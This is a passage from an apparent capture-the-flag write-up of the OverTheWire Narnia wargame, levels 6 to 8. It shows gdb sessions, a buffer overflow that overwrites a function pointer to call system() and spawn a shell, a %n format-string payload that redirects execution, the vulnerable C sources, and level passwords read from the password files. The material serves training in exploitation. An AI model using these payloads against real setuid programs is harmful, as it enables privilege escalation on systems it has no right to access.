class="c3">&nbsp;&lt;+</span><span class="c8">45</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">$0</span><span class="c3">x0,%eax<br> &nbsp; </span><span class="c8">0x565555d2</span><span class="c3">&nbsp;&lt;+</span><span class="c8">50</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">lea</span><span class="c3">&nbsp; &nbsp; -</span><span class="c8">0x8</span><span class="c3">(%ebp),%esp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x565555d5</span><span class="c3">&nbsp;&lt;+</span><span class="c8">53</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">pop</span><span class="c3">&nbsp; &nbsp; %ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x565555d6</span><span class="c3">&nbsp;&lt;+</span><span class="c8">54</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">pop</span><span class="c3">&nbsp; &nbsp; %ebx &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x565555d7</span><span class="c3">&nbsp;&lt;+</span><span class="c8">55</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">pop</span><span class="c3">&nbsp; &nbsp; %ebp &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x565555d8</span><span class="c3">&nbsp;&lt;+</span><span class="c8">56</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">lea</span><span class="c3">&nbsp; &nbsp; -</span><span class="c8">0x4</span><span class="c3">(%ecx),%esp<br> &nbsp; </span><span class="c8">0x565555db</span><span class="c3">&nbsp;&lt;+</span><span class="c8">59</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">ret</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; <br>End of assembler dump. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>Now with a breakpoint at main, we can see all of the corresponding addresses to each assembly instruction. Most notably, system call is at </span><span class="c8">0x565555c5</span><span class="c2">,so it follows that we should set a breakpoint there.</span></p><a id="t.3d18713562f0aad0963a25c1de5cd8d34ca55a94"></a><a id="t.71"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">(gdb) b *</span><span class="c8">0x565555c5</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Breakpoint </span><span class="c8">2</span><span class="c3">&nbsp;</span><span class="c8">at</span><span class="c3">&nbsp;</span><span class="c8">0x565555c5</span><span class="c3"><br>(gdb) c<br>Continuing.<br><br>Breakpoint </span><span class="c8">2</span><span class="c3">, </span><span class="c8">0x565555c5</span><span class="c3">&nbsp;</span><span class="c6">in</span><span class="c3">&nbsp;main ()<br>(gdb) x/s $</span><span class="c8">edx</span><span class="c3"><br></span><span class="c8">0x565555c5</span><span class="c3">: &nbsp; &nbsp; </span><span class="c11">&quot;ls -la&quot;</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>We can see that the </span><span class="c27">ls -la</span><span>&nbsp;command is in the edx register with an address of </span><span class="c8">0x565555c5</span><span class="c27">. </span><span class="c2">To get the address of the system function, we can simply type the following in the gdb console:</span></p><a id="t.58b1b3db5c5dbb800ba7356bdad7f491a7dbba51"></a><a id="t.72"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">(gdb) p</span><span class="c8">&nbsp;system<br></span><span class="c12">$1</span><span class="c3">&nbsp;= {&lt;text variable, </span><span class="c8">no</span><span class="c3">&nbsp;</span><span class="c8">debug</span><span class="c3">&nbsp;info&gt;} 0xf7e4c850 &lt;system&gt;</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>The system is located at </span><span class="c3">0xf7e4c850</span><span class="c2">. </span></p><h4 class="c21" id="h.j51clcuxsbhy"><span class="c16">Exploit</span></h4><p class="c0"><span class="c2">Therefore, we can flood the buffer with 8 bytes before overwriting the eip. Accordingly, the exploit will look like the following:</span></p><p class="c0 c29"><span class="c2"></span></p><p class="c25"><span class="c1">COMMAND + JUNK + \x50\xc8\xe4\xf7 + &lsquo; &lsquo; + JUNK</span></p><p class="c0 c29"><span class="c2"></span></p><p class="c0"><span class="c2">Using this exploit template, we can run the narnia6 binary in gdb and pass this payload::</span></p><a id="t.67179f49404970797e1a53d141cdf4432a7189ed"></a><a id="t.73"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">(gdb) r $(python -c </span><span class="c11">&quot;print &#39;</span><span class="c3">ls&#39;+</span><span class="c11">&#39;A&#39;</span><span class="c3">*</span><span class="c8">6</span><span class="c3">+</span><span class="c11">&#39;\x50\xc8\xe4\xf7&#39;</span><span class="c3">+</span><span class="c11">&#39; &#39;</span><span class="c3">+</span><span class="c11">&#39;B&#39;</span><span class="c3">*</span><span class="c8">4</span><span class="c11">&quot;)<br>The program being debugged has been started already.<br>Start it from the beginning? (y or n) y<br>Starting program: /narnia/narnia6 $(python -c &quot;</span><span class="c3">print </span><span class="c11">&#39;ls&#39;</span><span class="c3">+</span><span class="c11">&#39;A&#39;</span><span class="c3">*</span><span class="c8">6</span><span class="c3">+</span><span class="c11">&#39;\x50\xc8\xe4\xf7&#39;</span><span class="c3">+</span><span class="c11">&#39; &#39;</span><span class="c3">+</span><span class="c11">&#39;B&#39;</span><span class="c3">*</span><span class="c8">4</span><span class="c11">&quot;)<br>sh: 1: lsAAAAAAP: not found<br>[Inferior 1 (process 21970) exited with code 01]</span></p></td></tr></table><p class="c0"><span class="c50 c49 c31 c46">Note how the command + the junk (namely &lsquo;ls&rsquo; + &lsquo;A&rsquo; * 6) is equal to eight bytes</span></p><p class="c0 c29"><span class="c50 c49 c46 c83"></span></p><p class="c0"><span>We can see that the sh command is trying to execute </span><span class="c11">lsAAAAAAP</span><span>, which is not a command. However, this can be easily resolved by adding a semicolon to the end of the </span><span class="c27">ls</span><span class="c2">&nbsp;command using one less &lsquo;A&rsquo;:</span></p><a id="t.3bf37f39cfe317d051b31982548eed96a5da9e7d"></a><a id="t.74"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">(gdb) r $(python -c </span><span class="c11">&quot;print &#39;ls;&#39;+&#39;A&#39;*5+&#39;\x50\xc8\xe4\xf7&#39;+&#39; &#39;+&#39;B&#39;*4&quot;</span><span class="c3">)<br>Starting program: /narnia/narnia6 $(python -c </span><span class="c11">&quot;print &#39;ls;&#39;+&#39;A&#39;*5+&#39;\x50\xc8\xe4\xf7&#39;+&#39; &#39;+&#39;B&#39;*4&quot;</span><span class="c3">)<br>narnia0 &nbsp; &nbsp;narnia1 &nbsp; &nbsp;narnia2 &nbsp; &nbsp;narnia3 &nbsp; &nbsp;narnia4 &nbsp; &nbsp;narnia5 &nbsp; &nbsp;narnia6 &nbsp; &nbsp;narnia7 &nbsp; &nbsp;narnia8<br>narnia0</span><span class="c12">.c</span><span class="c3">&nbsp; narnia1</span><span class="c12">.c</span><span class="c3">&nbsp; narnia2</span><span class="c12">.c</span><span class="c3">&nbsp; narnia3</span><span class="c12">.c</span><span class="c3">&nbsp; narnia4</span><span class="c12">.c</span><span class="c3">&nbsp; narnia5</span><span class="c12">.c</span><span class="c3">&nbsp; narnia6</span><span class="c12">.c</span><span class="c3">&nbsp; narnia7</span><span class="c12">.c</span><span class="c3">&nbsp; narnia8</span><span class="c12">.c</span><span class="c3"><br>sh: </span><span class="c8">1</span><span class="c3">: AAAAAP: not found<br>[Inferior </span><span class="c8">1</span><span class="c3">&nbsp;(process </span><span class="c8">22579</span><span class="c3">) exited with </span><span class="c6">code</span><span class="c3">&nbsp;</span><span class="c8">01</span><span class="c3">]</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">The ls command was successfully executed. Running the narnia6 binary outside of gdb and implementing the sh command instead, we get a shell as narnia7:</span></p><a id="t.350ff57b120ad026d6eda9d54a8b1abe8e1f844a"></a><a id="t.75"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia6</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c12">$ </span><span class="c3">./narnia6 </span><span class="c12">$(</span><span class="c3">python -c </span><span class="c11">&quot;print &#39;sh;&#39;+&#39;A&#39;*5+&#39;\x50\xc8\xe4\xf7&#39;+&#39; &#39;+&#39;B&#39;*4&quot;</span><span class="c3">)<br></span><span class="c12">$ </span><span class="c3">whoami<br>narnia7<br></span><span class="c12">$ </span><span class="c3">cat /etc/narnia_pass/narnia7<br>ahkiaziphu</span></p></td></tr></table><h3 class="c10" id="h.kz3mi2kchbqk"><span class="c5">Source Code</span></h3><a id="t.e6f8c8416df6c2288d7ff54ec8e35acdfc4a2c1f"></a><a id="t.76"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c8">#include &lt;stdio.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;stdlib.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;string.h&gt;</span><span class="c3"><br><br></span><span class="c6">extern</span><span class="c3">&nbsp;</span><span class="c6">char</span><span class="c3">&nbsp;**environ;<br><br></span><span class="c39">// tired of fixing values...</span><span class="c3"><br></span><span class="c39">// - morla</span><span class="c3"><br></span><span class="c6">unsigned</span><span class="c3">&nbsp;</span><span class="c6">long</span><span class="c3">&nbsp;</span><span class="c4">get_sp</span><span class="c8">(</span><span class="c6">void</span><span class="c8">)</span><span class="c3">&nbsp;{<br> &nbsp; &nbsp; &nbsp; __asm__(</span><span class="c11">&quot;movl %esp,%eax\n\t&quot;</span><span class="c3"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c11">&quot;and $0xff000000, %eax&quot;</span><span class="c3"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; );<br>}<br><br></span><span class="c6">int</span><span class="c3">&nbsp;</span><span class="c4">main</span><span class="c8">(</span><span class="c6">int</span><span class="c8">&nbsp;argc, </span><span class="c6">char</span><span class="c8">&nbsp;*argv[])</span><span class="c3">{<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">char</span><span class="c3">&nbsp;b1[</span><span class="c8">8</span><span class="c3">], b2[</span><span class="c8">8</span><span class="c3">];<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">int</span><span class="c3">&nbsp; (*fp)(</span><span class="c6">char</span><span class="c3">&nbsp;*)=(</span><span class="c6">int</span><span class="c3">(*)(</span><span class="c6">char</span><span class="c3">&nbsp;*))&amp;</span><span class="c8">puts</span><span class="c3">, i;<br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">if</span><span class="c3">(argc!=</span><span class="c8">3</span><span class="c3">){ </span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;%s b1 b2\n&quot;</span><span class="c3">, argv[</span><span class="c8">0</span><span class="c3">]); </span><span class="c8">exit</span><span class="c3">(</span><span class="c8">-1</span><span class="c3">); }<br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c39">/* clear environ */</span><span class="c3"><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">for</span><span class="c3">(i=</span><span class="c8">0</span><span class="c3">; environ[i] != </span><span class="c8">NULL</span><span class="c3">; i++)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">memset</span><span class="c3">(environ[i], </span><span class="c11">&#39;\0&#39;</span><span class="c3">, </span><span class="c8">strlen</span><span class="c3">(environ[i]));<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c39">/* clear argz &nbsp; &nbsp;*/</span><span class="c3"><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">for</span><span class="c3">(i=</span><span class="c8">3</span><span class="c3">; argv[i] != </span><span class="c8">NULL</span><span class="c3">; i++)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">memset</span><span class="c3">(argv[i], </span><span class="c11">&#39;\0&#39;</span><span class="c3">, </span><span class="c8">strlen</span><span class="c3">(argv[i]));<br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">strcpy</span><span class="c3">(b1,argv[</span><span class="c8">1</span><span class="c3">]);<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">strcpy</span><span class="c3">(b2,argv[</span><span class="c8">2</span><span class="c3">]);<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c39">//if(((unsigned long)fp &amp; 0xff000000) == 0xff000000)</span><span class="c3"><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">if</span><span class="c3">(((</span><span class="c6">unsigned</span><span class="c3">&nbsp;</span><span class="c6">long</span><span class="c3">)fp &amp; </span><span class="c8">0xff000000</span><span class="c3">) == get_sp())<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">exit</span><span class="c3">(</span><span class="c8">-1</span><span class="c3">);<br> &nbsp; &nbsp; &nbsp; &nbsp;setreuid(geteuid(),geteuid());<br> &nbsp; &nbsp;fp(b1);<br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">exit</span><span class="c3">(</span><span class="c8">1</span><span class="c3">);<br>}</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">Once again, Ghidra confused the for loop with a while loop. In any case, the operations within these loops were of no interest in regards to exploiting the binary. Note that the stdlib library was included in the binary which allowed us to use the system function.</span></p><h2 class="c10" id="h.v80flpijk1ef"><span class="c40 c36">Narnia 7</span></h2><p class="c0"><span class="c2">After grabbing the credentials of the narnia7 user, we can ssh into the box as the compromised user and access the narnia7 binary. </span></p><h3 class="c10" id="h.ig8xq2hea5tr"><span class="c5">Binary Analysis</span></h3><h4 class="c21" id="h.h2wztyt0doyp"><span class="c16">Behavior</span></h4><p class="c0"><span class="c2">When executing it, we are met with a prompt that expects an input as an argument:</span></p><a id="t.08aa8f6d38e0cdf1bc77b26ba7ef4a299e6f77ff"></a><a id="t.77"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia7</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c12">$ </span><span class="c3">./narnia7<br></span><span class="c11">Usage:</span><span class="c3">&nbsp;./narnia7 &lt;buffer&gt;</span></p></td></tr></table><p class="c0 c29"><span class="c2"></span></p><p class="c0"><span class="c2">Putting a simple input such as &lsquo;A&rsquo;, we can see that nothing out of the ordinary occurs:</span></p><a id="t.31a42a1956b11828d67ffeb72b44ab907dd6a805"></a><a id="t.78"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia7@narnia:/narnia$ ./narnia7 A<br></span><span class="c4">goodfunction</span><span class="c8">()</span><span class="c3">&nbsp;= </span><span class="c8">0</span><span class="c3">x80486ff<br></span><span class="c4">hackedfunction</span><span class="c8">()</span><span class="c3">&nbsp;= </span><span class="c8">0</span><span class="c3">x8048724<br><br>before : ptrf() = </span><span class="c8">0</span><span class="c3">x80486ff (</span><span class="c8">0</span><span class="c3">xffffd568)<br>I guess you want to come to the hackedfunction...<br>Welcome to the goodfunction, but </span><span class="c6">i</span><span class="c3">&nbsp;said the Hackedfunction..</span></p></td></tr></table><h4 class="c21" id="h.ljfvw3fuhsaq"><span class="c16">Ghidra</span></h4><p class="c0"><span class="c2">The program exits after printing out the above text. We can use Ghidra to further analyse how the binary functions:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 298.67px;"><img alt="" src="images/image13.png" style="width: 624.00px; height: 298.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span>There are four functions of interest within the program: main, vuln, goodfunction, and hackedfunction. The main function takes an argument as input and passes it onto the vuln function. This vuln function allocates 128 bytes to the argument. Going further down this function, we can see that the local_84 variable is being assigned to the address of </span><span class="c27">goodfunction</span><span class="c2">. </span></p><p class="c0"><span>Looking at the code for goofunction, we see that the function simply prints out a message and exits. Interestingly, toward the last line of the vuln function, the snprintf function is called and uses local_84 as an argument. Therefore, it can be deduced that this program is most likely vulnerable to a format string exploit. Seeing as hackedfunction calls </span><span class="c27">/bin/sh </span><span class="c2">with setuid privileges, if the local_88 variable is overwritten to point to the address of hackedfunction, then we will receive a shell as the narnia8 user.</span></p><h3 class="c10" id="h.j683xnn6p9mj"><span class="c5">Format String Exploit</span></h3><p class="c0"><span>The methodology to exploiting this binary is the same as the one outlined in </span><span class="c38"><a class="c14" href="#h.e4mp3rcoeyar">Narnia 2</a></span><span class="c2">. We can construct a payload that will look like the following:</span></p><p class="c0 c29"><span class="c2"></span></p><p class="c25"><span class="c49 c36">(address to local_84) + %</span><span class="c49 c54 c36">PADDING</span><span class="c1">x </span></p><p class="c0 c29"><span class="c2"></span></p><p class="c0"><span class="c2">The padding will correspond to the decimal value of the address for hackedfunction so as to overwrite the value of the local_84 with the appropriate address. Note that the program will convert this decimal value into hexadecimal, and the hackedfunction will therefore be executed.</span></p><p class="c0 c29"><span class="c2"></span></p><p class="c0"><span>From executing the binary, we saw that the hacked address is located at </span><span class="c8">0</span><span class="c3">x8048724</span><span>. Converting this hexadecimal value to decimal, we see that it is equivalent to 134514468. Furthermore, the binary printed out the value for local_84 at </span><span class="c8">0</span><span class="c3">xffffd568</span><span class="c2">. Therefore, a string comprised of the address to this variable in little endian format (as this binary is in little endian) followed by a padding of 134514468 will result in the execution of hackedfunction:</span></p><a id="t.2123fb10eb5c09a5a02508038ceb2d59255a27e9"></a><a id="t.79"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia7</span><span class="c8">@narnia</span><span class="c3">:</span><span class="c12">/narnia$ ./</span><span class="c3">narnia7 $(python -c </span><span class="c11">&quot;print &#39;\x58\xd5\xff\xff&#39;+&#39;%134514468x%n&#39;&quot;</span><span class="c3">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>good</span><span class="c6">function</span><span class="c3">() = 0</span><span class="c4">x80486ff</span><span class="c3"><br></span><span class="c4">hackedfunction</span><span class="c3">() = 0</span><span class="c4">x8048724</span><span class="c3"><br><br></span><span class="c4">before</span><span class="c3">&nbsp;: </span><span class="c4">ptrf</span><span class="c3">() = 0</span><span class="c4">x80486ff</span><span class="c3">&nbsp;(</span><span class="c8">0xffffd558</span><span class="c3">)<br></span><span class="c4">I</span><span class="c3">&nbsp;</span><span class="c4">guess</span><span class="c3">&nbsp;</span><span class="c4">you</span><span class="c3">&nbsp;</span><span class="c4">want</span><span class="c3">&nbsp;</span><span class="c4">to</span><span class="c3">&nbsp;</span><span class="c4">come</span><span class="c3">&nbsp;</span><span class="c4">to</span><span class="c3">&nbsp;</span><span class="c4">the</span><span class="c3">&nbsp;</span><span class="c4">hackedfunction</span><span class="c3">...<br></span><span class="c4">Way</span><span class="c3">&nbsp;</span><span class="c4">to</span><span class="c3">&nbsp;</span><span class="c4">go</span><span class="c3">!!!!</span><span class="c4">$</span><span class="c3">&nbsp;</span><span class="c4">whoami</span><span class="c3"><br></span><span class="c4">narnia8</span></p><p class="c19"><span class="c4">$</span><span class="c3">&nbsp;</span><span class="c4">cat</span><span class="c3">&nbsp;/</span><span class="c4">etc</span><span class="c3">/</span><span class="c4">narnia_pass</span><span class="c3">/</span><span class="c4">narnia8</span><span class="c3"><br></span><span class="c4">mohthuphog</span></p></td></tr></table><h3 class="c10" id="h.kisnd3uzx3yn"><span class="c5">Source Code</span></h3><a id="t.311b7578102a36c0e9495a50fa7a970d0d487a26"></a><a id="t.80"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c8">#include &lt;stdio.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;stdlib.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;string.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;stdlib.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;unistd.h&gt;</span><span class="c3"><br><br></span><span class="c6">int</span><span class="c3">&nbsp;</span><span class="c4">goodfunction</span><span class="c8">()</span><span class="c3">;<br></span><span class="c6">int</span><span class="c3">&nbsp;</span><span class="c4">hackedfunction</span><span class="c8">()</span><span class="c3">;<br><br></span><span class="c6">int</span><span class="c3">&nbsp;</span><span class="c4">vuln</span><span class="c8">(</span><span class="c6">const</span><span class="c8">&nbsp;</span><span class="c6">char</span><span class="c8">&nbsp;*format)</span><span class="c3">{<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">char</span><span class="c3">&nbsp;buffer[</span><span class="c8">128</span><span class="c3">];<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">int</span><span class="c3">&nbsp;(*ptrf)();<br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">memset</span><span class="c3">(buffer, </span><span class="c8">0</span><span class="c3">, </span><span class="c6">sizeof</span><span class="c3">(buffer));<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;goodfunction() = %p\n&quot;</span><span class="c3">, goodfunction);<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;hackedfunction() = %p\n\n&quot;</span><span class="c3">, hackedfunction);<br><br> &nbsp; &nbsp; &nbsp; &nbsp;ptrf = goodfunction;<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;before : ptrf() = %p (%p)\n&quot;</span><span class="c3">, ptrf, &amp;ptrf);<br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;I guess you want to come to the hackedfunction...\n&quot;</span><span class="c3">);<br> &nbsp; &nbsp; &nbsp; &nbsp;sleep(</span><span class="c8">2</span><span class="c3">);<br> &nbsp; &nbsp; &nbsp; &nbsp;ptrf = goodfunction;<br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">snprintf</span><span class="c3">(buffer, </span><span class="c6">sizeof</span><span class="c3">&nbsp;buffer, format);<br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">return</span><span class="c3">&nbsp;ptrf();<br>}<br><br></span><span class="c6">int</span><span class="c3">&nbsp;</span><span class="c4">main</span><span class="c8">(</span><span class="c6">int</span><span class="c8">&nbsp;argc, </span><span class="c6">char</span><span class="c8">&nbsp;**argv)</span><span class="c3">{<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">if</span><span class="c3">&nbsp;(argc &lt;= </span><span class="c8">1</span><span class="c3">){<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">fprintf</span><span class="c3">(</span><span class="c8">stderr</span><span class="c3">, </span><span class="c11">&quot;Usage: %s &lt;buffer&gt;\n&quot;</span><span class="c3">, argv[</span><span class="c8">0</span><span class="c3">]);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">exit</span><span class="c3">(</span><span class="c8">-1</span><span class="c3">);<br> &nbsp; &nbsp; &nbsp; &nbsp;}<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">exit</span><span class="c3">(vuln(argv[</span><span class="c8">1</span><span class="c3">]));<br>}<br><br></span><span class="c6">int</span><span class="c3">&nbsp;</span><span class="c4">goodfunction</span><span class="c8">()</span><span class="c3">{<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;Welcome to the goodfunction, but i said the Hackedfunction..\n&quot;</span><span class="c3">);<br> &nbsp; &nbsp; &nbsp; &nbsp;fflush(</span><span class="c8">stdout</span><span class="c3">);<br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">return</span><span class="c3">&nbsp;</span><span class="c8">0</span><span class="c3">;<br>}<br><br></span><span class="c6">int</span><span class="c3">&nbsp;</span><span class="c4">hackedfunction</span><span class="c8">()</span><span class="c3">{<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;Way to go!!!!&quot;</span><span class="c3">);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;fflush(</span><span class="c8">stdout</span><span class="c3">);<br> &nbsp; &nbsp; &nbsp; &nbsp;setreuid(geteuid(),geteuid());<br> &nbsp; &nbsp; &nbsp; &nbsp;system(</span><span class="c11">&quot;/bin/sh&quot;</span><span class="c3">);<br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">return</span><span class="c3">&nbsp;</span><span class="c8">0</span><span class="c3">;<br>}</span></p></td></tr></table><h2 class="c10" id="h.2cvhcmtmn70t"><span class="c36 c40">Narnia 8</span></h2><p class="c0"><span class="c2">After exploiting a total of eight binaries, we are left with the task of exploiting the ninth and final binary: narnia8. </span></p><h3 class="c10" id="h.v7t5s7tgs2x2"><span class="c5">Binary Analysis</span></h3><p class="c0"><span class="c2">We can start by executing the binary to see how it behaves:</span></p><a id="t.22093528e44ab26414847efd0e49cd0fdc84786e"></a><a id="t.81"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia8</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c12">$ </span><span class="c3">./narnia8<br>./narnia8 argument</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">Similar to the previous binaries, this program expects an argument. Providing a normal input does not seem to do anything except print that same value back out:</span></p><a id="t.8b8f73ee9cf72bb06dc4dcfafa4fb4ae6c07fe95"></a><a id="t.82"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia8</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c12">$ </span><span class="c3">./narnia8 A<br>A</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">Furthermore, when providing a large input such as 5000 &lsquo;A&rsquo;s, no segmentation fault occurred. </span></p><h4 class="c21" id="h.wb361gqlsxjo"><span class="c16">Ghidra</span></h4><p class="c0"><span class="c2">We can further analyse this binary using Ghidra to understand the inner workings of the program:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 428.86px; height: 661.63px;"><img alt="" src="images/image6.png" style="width: 428.86px; height: 661.63px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">There are two interesting functions: main and func. The main function simply gets the argument and passes it into func. Within this function are 2 global variables: local_1c and local_8. Twenty bytes are allocated to the former, while the latter is set to the argument. The local_1c variable has all of its contents set to 0. Within the while loop appears to be a sort of operation that is setting local_1c equivalent to some index within local_8. Just as in the previous binaries, Ghidra may have mistook a for loop for a while loop. It is possible that this segment in the code actually looks like the following:</span></p><a id="t.6d48df83d074175af6a1f420d581e0f8d2dbd8a4"></a><a id="t.83"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c6">for</span><span class="c3">(</span><span class="c8">i</span><span class="c3">=</span><span class="c8">0</span><span class="c3">; local_8[i] != </span><span class="c11">&#39;\0&#39;</span><span class="c3">; </span><span class="c8">i</span><span class="c3">++){<br><br> &nbsp; &nbsp;local_1c[i] = local_8[i];<br> &nbsp; &nbsp;i = i + </span><span class="c8">1</span><span class="c3">;<br>}</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>After performing this operation, the program prints the contents of local_1c. Looking at this </span><span class="c27">for loop</span><span>,</span><span class="c2">&nbsp;we can see that the vulnerability lies within the fact that 20 bytes are allocated to the local_1c variable, but an argument of greater than 20 bytes can be inputted. </span></p><p class="c0"><span>Additionally, running </span><span class="c27">checksec</span><span class="c2">&nbsp;on the binary reveals that the NX bit is also disabled:</span></p><a 